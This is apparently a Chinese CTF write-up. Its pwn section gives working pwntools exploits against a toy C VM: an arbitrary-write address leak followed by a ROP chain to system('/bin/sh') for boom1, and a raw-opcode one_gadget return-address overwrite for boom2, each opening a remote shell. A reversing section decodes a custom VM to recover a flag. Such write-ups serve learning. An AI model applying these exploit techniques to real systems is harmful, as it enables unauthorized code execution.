# pwn

# boom1

源码：
https://github.com/cng3s/tiny-c-vm-demo/blob/0cde2796138a800bcf6a0dcc8ef6f191da0d8bfe/main.c

任意地址写，fuzz出来的

```cpp
int main(){
		int* a;
		a = 0xdeadbeef;
		*a = 0xcafebabe;
	}
```

获取栈地址，elf基地址，为什么可以呢，因为程序虚拟机的内存里有一些未初始化的值残留在里面：

```cpp
int main(){
		
		int b;
		int* a;
		int stack;
		int elf_base;
		
		
		a = &b;
		a = a+3;
		stack = *a;
		stack = stack - 0xe8;
		
		a = &b;
		a = a + 67081;
		elf_base = *a;
		elf_base = elf_base - 0x5248;
		
		
		return 0;
	}
```

可以用一下代码验证地址是否正确获取了：

```c
int main(){
		int b;
		int* a;
		int stack;
		
		a = &b;
		a = a+3;
		stack = *a;
		write(1,stack,0x100);
		
		return 0;
	}
```

程序还对指令周期有限制，代码不能太长（好像是），最后还是要getshell来拿flag，orw根本就不行

exp：

```python=
from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))




def main(host,port=24573):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
		debug(0x000000000004E2B)
		# gdb.attach(p)
	p.recvuntil("I'm living...\n")
	
	# 0x0000000000021102: pop rdi; ret;
	
	p_rdi = 0x0000000000021102;
	
	
	code = """
	int main(){
		int elf_base;
		int* a;
		int stack;
		
		a = &elf_base;		
		a = a + 3;
		stack = *a;
		stack = stack - 0xe8;
		a = a + 67078;
		elf_base = *a;	
		
		// leak
		write(1,stack,0x100);
		
		a = elf_base + 0x200dc8;
		*a = 1;
		// rop
		read(0,stack,0x200);
		
	}
	"""
	p.send(code)
	libc.address = u64(p.recv(8)) - 0x20830
	info("libc : " + hex(libc.address))
	
	payload = p64(libc.address+p_rdi) + p64(libc.search("/bin/sh\x00").next()) + p64(libc.symbols["system"])
	p.send(payload)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	elf = ELF("./pwn",checksec=False)
	main(args['REMOTE'])
```

# boom2

```c
一个去掉了库函数的boom1，读的是int64的token，[对应源码](https://github.com/cng3s/tiny-c-vm-demo/blob/master/vm.c)

支持的命令如下
​```
0 : LEA
6 : ENT
8 : LEV
9 : LI
10 : LC
11 : SI
12 : SC
13 : PUSH
14 : OR
15 : XOR
16 : AND
17 : EQ
18 : NE
19 : LT
20 : GT
21 : LE
22 : GE
23 : SHL
24 : SHR
25 : ADD
26 : SUB
27 : MUL
28 : DIV
29 : MOD
30 : EXIT
​```

程序一开始把argv的地址写入到虚拟机的栈里，我们可以利用这个，在配合指令，加加减减把`main`函数的返回地址改成`one_gadget`

​```python=
from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))




def main(host,port=36642):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
		debug(0x000000000000B5C)
		# gdb.attach(p)
	p.recvuntil("Input your code> ")
	
	# 0x0000000000021102: pop rdi; ret;
	
	# p_rdi = 0x0000000000021102;
	
	offset = 0x45216 - 0x20830
	
	op = ""
	op += p64(1) + p64(0) # mov rax,0
	op += p64(13)	# push rax
	op += p64(1) + p64(0x10000000000000000-0xe8) # mov rax,-0xe8
	op += p64(13)	# push rax
	op += p64(0) + p64(0xfffffffffffffffc) # lea rax, [rbp-4] : code(0)
	op += p64(9) 	# mov rax,[rax]
	op += p64(25)	# add rax,[rsp]
	op += p64(13)	# push rax
	op += p64(1) + p64(offset) # mov rax,offset
	op += p64(13)	# push rax
	op += p64(0) + p64(0x10000000000000000-0x7) # lea rax, [rbp-7] : code(0)
	op += p64(9) 	# mov rax,[rax]
	op += p64(9) 	# mov rax,[rax]
	op += p64(25)	# add rax,[rsp]
	op += p64(11)	# mov [rsp],rax
	op += p64(30)	# exit
	p.send(op)
	p.interactive()
	
if __name__ == "__main__":
	# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./pwn",checksec=False)
	main(args['REMOTE'])
​```
```

这题明显比boom1简单，但是解出来的人却少了100多，就离谱

# re

## signal

脚本解析：
```python=
opcode = [10,4, 16,8,3, 5,1,4, 32,8,5, 3,1,3, 2,8,11,1,12,8,4, 4,1,5, 3,8,3, 33,1,11,8,11,1,4, 9,8,3, 32,1,2, 81,8,4, 36,1,12,8,11,1,5, 2,8,2, 37,1,2, 54,8,4, 65,1,2, 32,8,5, 1,1,5, 3,8,2, 37,1,4, 9,8,3, 32,1,2, 65,8,12,1,7, 34,7, 63,7, 52,7, 50,7, 114,7, 51,7, 24,7, -89,7, 49,7, -15,7, 40,7, -124,7, -63,7, 30,7, 122]

op_idx = 0

res_idx = 0
j = 0
input_idx = 0
value = 0
cmp_idx = 0


while op_idx < 114:
	if opcode[op_idx] == 1:
		print "res[%d] = r0"%(res_idx)
		op_idx += 1
        res_idx += 1
        input_idx += 1
	elif opcode[op_idx] == 2:
		print "mov r0,opcode[%d]+input[%d]"%(op_idx+1,input_idx)
		op_idx += 2
	elif opcode[op_idx] == 3:
		print "mov r0,input[%d]-opcode[%d]"%(input_idx,op_idx+1)
		op_idx += 2
	elif opcode[op_idx] == 4:
		print "mov r0,opcode[%d]^input[%d]"%(op_idx+1,input_idx)
		op_idx += 2
	elif opcode[op_idx] == 5:
		print "mov r0,opcode[%d]*input[%d]"%(op_idx+1,input_idx)
		op_idx += 2
	elif opcode[op_idx] == 6:
		print "nop"
		op_idx += 1
	elif opcode[op_idx] == 7:
		print "cmp res[%d],opcode[%d]" % (cmp_idx,op_idx+1)
		cmp_idx += 1
		op_idx += 2
	elif opcode[op_idx] == 8:
		print "mov input[%d],r0"%j
		j += 1
		op_idx += 1
	elif opcode[op_idx] == 10:
		print "read 15 bytes into input array"
		op_idx += 1
	elif opcode[op_idx] == 11:
		print "mov r0,input[%d]-1"%input_idx
		op_idx += 1
	elif opcode[op_idx] == 12:
		print "mov r0,input[%d]+1"%input_idx
		op_idx += 1
	else:
		op_idx += 1
	print "-"*0x20
		
```

解析结果:

```
read 15 bytes into input array
--------------------------------
mov r0,opcode[2]^input[0]
--------------------------------
mov input[0],r0
--------------------------------
mov r0,input[0]-opcode[5]
--------------------------------
res[0] = r0
--------------------------------
mov r0,opcode[8]^input[1]
--------------------------------
mov input[1],r0
--------------------------------
mov r0,opcode[11]*input[1]
--------------------------------
res[1] = r0
--------------------------------
mov r0,input[2]-opcode[14]
--------------------------------
mov input[2],r0
--------------------------------
mov r0,input[2]-1
--------------------------------
res[2] = r0
--------------------------------
mov r0,input[3]+1
--------------------------------
mov input[3],r0
--------------------------------
mov r0,opcode[21]^input[3]
--------------------------------
res[3] = r0
--------------------------------
mov r0,opcode[24]*input[4]
--------------------------------
mov input[4],r0
--------------------------------
mov r0,input[4]-opcode[27]
--------------------------------
res[4] = r0
--------------------------------
mov r0,input[5]-1
--------------------------------
mov input[5],r0
--------------------------------
mov r0,input[5]-1
--------------------------------
res[5] = r0
--------------------------------
mov r0,opcode[34]^input[6]
--------------------------------
mov input[6],r0
--------------------------------
mov r0,input[6]-opcode[37]
--------------------------------
res[6] = r0
--------------------------------
mov r0,opcode[40]+input[7]
--------------------------------
mov input[7],r0
--------------------------------
mov r0,opcode[43]^input[7]
--------------------------------
res[7] = r0
--------------------------------
mov r0,input[8]+1
--------------------------------
mov input[8],r0
--------------------------------
mov r0,input[8]-1
--------------------------------
res[8] = r0
--------------------------------
mov r0,opcode[50]*input[9]
--------------------------------
mov input[9],r0
--------------------------------
mov r0,opcode[53]+input[9]
--------------------------------
res[9] = r0
--------------------------------
mov r0,opcode[56]+input[10]
--------------------------------
mov input[10],r0
--------------------------------
mov r0,opcode[59]^input[10]
--------------------------------
res[10] = r0
--------------------------------
mov r0,opcode[62]+input[11]
--------------------------------
mov input[11],r0
--------------------------------
mov r0,opcode[65]*input[11]
--------------------------------
res[11] = r0
--------------------------------
mov r0,opcode[68]*input[12]
--------------------------------
mov input[12],r0
--------------------------------
mov r0,opcode[71]+input[12]
--------------------------------
res[12] = r0
--------------------------------
mov r0,opcode[74]^input[13]
--------------------------------
mov input[13],r0
--------------------------------
mov r0,input[13]-opcode[77]
--------------------------------
res[13] = r0
--------------------------------
mov r0,opcode[80]+input[14]
--------------------------------
mov input[14],r0
--------------------------------
mov r0,input[14]+1
--------------------------------
res[14] = r0
--------------------------------
cmp res[0],opcode[85]
--------------------------------
cmp res[1],opcode[87]
--------------------------------
cmp res[2],opcode[89]
--------------------------------
cmp res[3],opcode[91]
--------------------------------
cmp res[4],opcode[93]
--------------------------------
cmp res[5],opcode[95]
--------------------------------
cmp res[6],opcode[97]
--------------------------------
cmp res[7],opcode[99]
--------------------------------
cmp res[8],opcode[101]
--------------------------------
cmp res[9],opcode[103]
--------------------------------
cmp res[10],opcode[105]
--------------------------------
cmp res[11],opcode[107]
--------------------------------
cmp res[12],opcode[109]
--------------------------------
cmp res[13],opcode[111]
--------------------------------
cmp res[14],opcode[113]
--------------------------------
```

一位一位的算：
```python=
import string
opcode = [10,4, 16,8,3, 5,1,4, 32,8,5, 3,1,3, 2,8,11,1,12,8,4, 4,1,5, 3,8,3, 33,1,11,8,11,1,4, 9,8,3, 32,1,2, 81,8,4, 36,1,12,8,11,1,5, 2,8,2, 37,1,2, 54,8,4, 65,1,2, 32,8,5, 1,1,5, 3,8,2, 37,1,4, 9,8,3, 32,1,2, 65,8,12,1,7, 34,7, 63,7, 52,7, 50,7, 114,7, 51,7, 24,7, -89,7, 49,7, -15,7, 40,7, -124,7, -63,7, 30,7, 122]
enc = [34,63,52,50,114,51,24,-89,49,-15,40,-124,-63,30,122]

flag = ''

flag += chr((enc[0]+opcode[5])^opcode[2])
flag += chr((enc[1]/opcode[11])^opcode[8])
flag += chr(enc[2]+opcode[14]+1)
flag += chr((enc[3]^opcode[21])-1)
flag += chr((enc[4]+opcode[27])/opcode[24])
flag += chr(enc[5]+2)
flag += chr(((enc[6]+opcode[37])&0xff)^opcode[34])
# flag += chr((enc[7]^opcode[43])-opcode[40]) # equal 2
flag += '2'
flag += chr(enc[8])
flag += chr((((enc[9]-opcode[53])&0xff)/opcode[50])&0xff)
flag += chr((enc[10]^opcode[59])-opcode[56])
flag += chr((((enc[11]/opcode[65])&0xff)-opcode[62])&0xff)
flag += chr((((enc[12]-opcode[71])&0xff)/opcode[68])&0xff)
flag += chr(((enc[13]+opcode[77])&0xff)^(opcode[74]&0xff))
# flag += '_'
flag += chr((enc[14]-opcode[80])-1)
print flag
```
